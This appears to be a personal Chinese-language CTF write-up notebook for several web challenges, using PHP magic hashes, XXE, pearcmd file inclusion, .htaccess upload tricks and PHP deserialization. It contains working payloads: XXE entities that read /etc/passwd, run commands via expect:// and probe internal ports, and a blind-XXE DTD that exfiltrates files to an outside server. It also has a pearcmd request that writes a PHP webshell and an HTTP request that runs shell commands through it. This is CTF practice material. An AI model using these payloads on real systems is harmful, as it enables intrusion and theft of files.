

# 07 第七章 灵蛛探穴与阴阳双生符


题干中:有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。


描述的是 **robots.txt** 文件。
robots.txt

- 它是一个放在网站根目录下的 **纯文本文件**
    
- URL 一般是:

```arduino
http://example.com/robots.txt

```
- 用于告诉搜索引擎爬虫（Googlebot、Bingbot 等）：
    
    - 哪些页面可以抓取
        
    - 哪些页面不能抓取
        

这就是 **Robots 协议（Robots Exclusion Protocol, REP）**。


- **不是强制安全措施**：恶意爬虫完全可以忽略 `robots.txt`
    
- 如果要真正保护页面，应使用 **身份验证** 或 **防止直接访问**
    
- 大多数正规搜索引擎会遵守 `robots.txt`



很多靶场或 CTF 题里会故意在 `robots.txt` 里放敏感路径：

- 访问 `http://靶机IP/robots.txt`
    
- 看到 `Disallow: /flag.php`
    
- 然后手动访问 `http://靶机IP/flag.php` 获取 flag


在浏览器访问：
```
http://目标IP或域名/flag.php

```

服务器返回这样的页面
```php
highlight_file(__FILE__); // 显示源码
$flag = getenv('FLAG');   // 从环境变量读取 flag

$a = $_GET["a"] ?? "";
$b = $_GET["b"] ?? "";

// 条件 1：如果 a 和 b 的值完全相等 → 拦截
if($a == $b){
    die("error 1");
}

// 条件 2：如果 a 和 b 的 MD5 不相等 → 拦截
if(md5($a) != md5($b)){
    die("error 2");
}

echo $flag;


```

我们可以得知：

PHP 的 `==` 是弱比较，`md5()` 返回的是字符串，可以触发 **"magic hash" 漏洞**：

- 当 `md5($input)` 结果以 `0e` 开头且后面全是数字，PHP 会把它当作科学计数法数字 `0`
    
- 两个这样的值比较时，`"0e12345" == "0e67890"` 会被当成 `0 == 0`，返回 true
    

这类输入有很多已知样本，例如：

- `240610708` → md5 = `0e462097431906509019562988736854`
    
- `QNKCDZO` → md5 = `0e830400451993494058024219903391`


最终构造url
```
http://目标IP/flag.php?a=240610708&b=QNKCDZO

```


# 10 第十章 天机符阵_revenge


我们输入123
首先发现

![[Pasted image 20250920234858.png]]


```
DOMDocument::loadXML()
```
这个报错的意思是我们需要输入一个xml格式的内容进行解析。
这道题解析出的内容会加入html中。所以我们怀疑
可能会有xxe漏洞（==XML外部实体注入漏洞==）


## XXE(XML外部实体注入漏洞)
XXE主要分为两种，有回显和无回显。



### 有回显

1. 读取任意文件 file 协议：`file:///etc//passwd` php 协议：`php://filter/read=convert.base64-encode/resource=index.php`
2. 执行系统命令 部分情况会有，在特殊的配置环境下，如PHP环境中PHP的expect模块被加载到了易受攻击的系统或者能处理XML的应用中，就能执行命令，简单payload如下
```
<?xml version="1.0" encoding="utf-8"?
<!DOCTYPE xxe [
<!ELEMENT name ANY >        //- `<!ELEMENT ...>` = 声明一个元素
                                `name` = 元素名
							    `ANY` = 该元素可以包含 **任意内容**（文本、子元素、实体）
<!ENTITY xxe SYSTEM "expect://ifconfig" >]>
<root>
<name>&xxe;</name>
</root>
```
\<!ELEMENT name ANY >  
- `<!ELEMENT ...>` = 声明一个元素
                                `name` = 元素名
							    `ANY` = 该元素可以包含 **任意内容**（文本、子元素、实体）


\<!ENTITY xxe SYSTEM "expect://ifconfig" >]>

- `<!ENTITY ...>` = 定义一个 XML 实体
    
- `xxe` = 实体名字
    
- `SYSTEM "expect://ifconfig"` = 实体的来源/内容`
  "expect://ifconfig"` 是 PHP 特有的 stream wrapper

  `expect://` 可以执行 **系统命令**
 
  `ifconfig` 是要执行的命令
例如"expect://id"就会执行id命令

当然这里通常还可以
1. 读取任意文件 file 协议：`file:///etc//passwd`
2. php 协议：`php://filter/read=convert.base64-encode/resource=index.php`

然后进行输出就可以

注意：本题下面的内容要改成
<解析>&xxe</解析>




<!--个人理解：
```
<?xml version="1.0" encoding="utf-8"?
<!DOCTYPE xxe [
<!ELEMENT name ANY >        //- `<!ELEMENT ...>` = 声明一个元素
                                `name` = 元素名
							    `ANY` = 该元素可以包含 **任意内容**（文本、子元素、实体）
<!ENTITY xxe SYSTEM "expect://ifconfig" >]>






<root>
<name>&xxe;</name>
</root>
```

上面一段类似于写一种函数（脚本）



下面写的内容是加入html中的内容，并且通过”&“来引用函数，进而进行输出。-->


3. 探测内网端口 借助漏洞实现内网探测，常见payload如下
```
<?xml version="1.0" encoding="utf-8"?
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "http://192.168.199.100:80">]>
<root>
<name>&xxe;</name>
</root>
```


### 无回显
> 无回显的XXE利用必须借助外部服务器把回显内容带出来，这种的XXE也称为 blind XXE

- 源码

```php
<?php
$data = file_get_contents('php://input');

$dom = new DOMDocument();
$dom->loadXML($data);
```
如果直接执行的话是没有任何回显的，可以使用http协议将请求发送到远程服务器上，从而获取文件内容 首先在远程服务器写入一个dtd文件，例如test.dtd，文件内容如下


```
注意：%号需要实体16进制编码为&#x25;
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://192.168.2.1/%file;'>">
```
利用Payload，将数据外带到服务端

```
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://192.168.2.1/test.dtd">
%remote;%int;%send;
]>
```
执行逻辑大概如下：

1. 从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote先调用，调用后请求远程服务器上的test.dtd ，有点类似于将 test.dtd包含进来
2. %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件
3. 将 %file 的结果填入到 %send 以后 (因为实体的值中不能有 %, 所以将其转成html实体编码 &#x25;)，
4. 再调用 %send; 把我们的读取到的数据以GET请求的方式发送到我们的服务器上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题


# 16 第十六章 昆仑星途
php源码中有include（）
考点是文件包含。
传参是get方式传入名为“file”的变量里


我们在附件中首先发现这个：
[PHP]
allow_url_fopen = On
allow_url_include = On


并且

```bash
#!/bin/bash    //告诉系统用bash运行这个脚本
echo $FLAG > /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 30).txt
unset FLAG
apache2-foreground

```

意思是，每次开启容器在flag后面加上一个三十位的随机数。

==所以我们应该思考我们应该要拿到终端的控制权==
进行
```bash
ls /
```

来看看我们的falgxxxxxxxx.txt到底叫什么。



我们思考是不是远程文件包含。


但是我们尝试之后发现，比赛环境根本没出网。


那我们应该尝试pearcmd


## ==pearcmd==

pear是一个在PHP 7.3 及以前版本是默认安装的文件，后续只会在编译 PHP 的时候使用`--with-pear`参数才会安装。但 Docker 任意版本的镜像中都包含了 pear。


其本质是一个从固定库中下载.php类型扩展的一个命令行工具



所以我们ctf比赛中都是使用docker的容器建立环境的。所以，所有ctf都可以使用这个技巧。



Pear 的本质是一个命令行工具，pearcmd.php 默认的安装路径为`/usr/local/lib/php/pearcmd.php`。在命令行状态下，可以使用 pear 或者 /usr/local/lib/php/pearcmd.php 执行命令。

那么我们可以通过文件包含把/usr/local/lib/php/pearcmd.php 加入当前web所在文件夹进而使用pear这个工具

我们的payload如下

```
/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/111.php
```

`/?+config-create+/&file=/usr/local/lib/php/pearcmd.php`  //引入pear工具

&    //html的并列符
`+`    //pear的分隔符

` /<?=phpinfo()?>+/tmp/111.php`     //把phpinfo（）写到/tmp/111.php文件里。

`phpinfo()`     //一个检验php配置文件的函数   我们用于检验是否成功

发现有回显，说明配置成功了



进而我们的payload
```
/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=$_POST['123']?>+/tmp/111.php

```


让我们的文件用post方式接受传参给123的一句话木马

然后我们用yakit发一个


```
POST /?file=/tmp/111.php HTTP/1.1

Host: 127.0.0.1:52319

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br, zstd

Accept-Language: zh-CN,zh;q=0.9

Sec-Fetch-Mode: navigate

sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36

Sec-Fetch-User: ?1

sec-ch-ua-platform: "Windows"

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

sec-ch-ua-mobile: ?0

Content-Type: application/x-www-form-urlencoded

Content-Length: 14

  

123=system("ls /");
```

我们就可以在system（）中执行shell命令。

看到flag名字叫flag-eqw4ixOFcgqOXJUOYpzGvrRcSTXi5c.txt


我们直接123=system(cat /flag-eqw4ixOFcgqOXJUOYpzGvrRcSTXi5c.txt);


就能获得flag。


https://furina.org.cn/2023/09/05/pearcmd/





#   14 第十四章 御神关·补天玉碑


考点：upload 中的apache特殊配置文件    ''.htaccess''

首先，这道题禁止我们传入一个php文件，并且不让用.phtml后缀。大小写混合绕过更是不行，%00截断也很过时。

我们上传.pphphp时文件可以上传，但是无法连接后门，说明他并没有删除我文件后缀中的php。


所以，根据题中提示，我们确定使用.htaccess文件

htaccess可以干很多事情，其中一个功能是可以将任何文件当作php解析

```
<FilesMatch "$ name">
 SetHandler application/x-httpd-php
 </FilesMatch>
```

$ name在本题中名字为yiju_muma.png

意思是将这个文件当成php来解析。那我们思路很清晰了，把写好的php伪装成png
直接上传，再上传.htaccess配置文件，就可以把木马当成php解析，连接即可发现falg在根目录中。



#   13 第十三章 通幽关·灵纹诡影

纯唐题，上传图片马，用.php.jpg绕过一下轻松做。



# 19 第十九章 星穹真相·补天归源


考点：php反序列化

```php
<?php  
highlight_file(__FILE__);  
  
class Person  
{  
    public $name;  
    public $id;  
    public $age;  
  
    public function __invoke($id)  
    {        $name = $this->id;        
			 $name->name = $id;        
             $name->age = $this->name;  
    }  
}  
  
class PersonA extends Person  
{  
    public function __destruct()  
    {        $name = $this->name;        
             $id = $this->id;        
             $age = $this->age;
             $name->$id($age);  
    }  
}  
  
class PersonB extends Person  
{  
    public function __set($key, $value)  
    {        $this->name = $value;  
    }  
}  
  
class PersonC extends Person  
{  
    public function __Check($age)  
    {  
        if(str_contains( $age . $this->name,"flag"))  
        {  
            die("Hacker!");  
        }        $name = $this->name;
                 $name($age);  
    }  
  
    public function __wakeup()  
    {        $age = $this->age;
             $name = $this->id;
             $name->age = $age;
             $name($this);  
    }  
}  
  
if(isset($_GET['person']))  
{    $person = unserialize($_GET['person']);  
}****
```

php源码如上

本题中Person以ddd代替
PersonA以aaa代替
B、C同理

我们分析代码可知本题有两个入口突破点，一个是“__wakeup()”一个是“__destruct() ”


经过分析我们可以简单看到几个重要的地方一个是ccc中的`$name($this);  `（将对象当成函数调用，应该用来触发invoke）
另一个是ccc中的`$name($age);`（调用函数）
还有aaa中的 `$name->$id($age);`（调用内置函数）


我们简单观察就可以猜到，最后的payload应该要执行check（）中的`$name($age)`

那该怎么走到c中的check函数？？？
只有一个地方调用即为aaa中的`$name->$id($age);`


所以最基本的思路已经有了，从aaa中的destruct（）入手连接到ccc的check（）执行系统命令


但我们过一遍会发现ccc中的`$name($this);  `（将对象当成函数调用，应该用来触发invoke）

而invoke中有一步    $name = $this->id;        
			     $name->name = $id;  

说明我们person类的id应该为一个对象

所以我们为了让invoke可以正常运行，不会报错，我们给其对象赋值给bbb这个无关对象即可



最后，将payload的cat /flag的s改为大写S即可，这样就可以16进制绕过\x66这样即可。
